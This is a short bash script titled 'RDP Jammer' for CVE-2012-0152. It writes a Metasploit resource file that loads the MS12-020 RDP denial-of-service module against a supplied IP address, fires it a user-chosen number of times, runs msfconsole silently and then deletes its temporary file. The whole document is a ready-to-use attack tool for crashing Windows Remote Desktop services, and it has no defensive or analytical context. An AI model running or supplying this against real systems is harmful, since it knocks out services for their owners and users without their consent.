#!/bin/bash
#RDP Jammer : CVE-2012-0152
# SYNTAX : Script.sh <IP_ADDRESS> <NUMBER_OF_ATTACK> 
rm -r /tmp/tempRcfile.rc &> /dev/null
touch /tmp/tempRcfile.rc
echo "use auxiliary/dos/windows/rdp/ms12_020_maxchannelids" >> /tmp/tempRcfile.rc
echo "set RHOST $1 ">> /tmp/tempRcfile.rc
echo "exploit" >> /tmp/tempRcfile.rc
x=1
while [ $x -le $2 ]
do
  echo "exploit">> /tmp/tempRcfile.rc
x=$(( $x + 1 ))
done
echo "exit" >> /tmp/tempRcfile.rc
echo "Working..."
msfconsole -r /tmp/tempRcfile.rc &> /dev/null
rm -r /tmp/tempRcfile.rc &> /dev/null
echo DONE
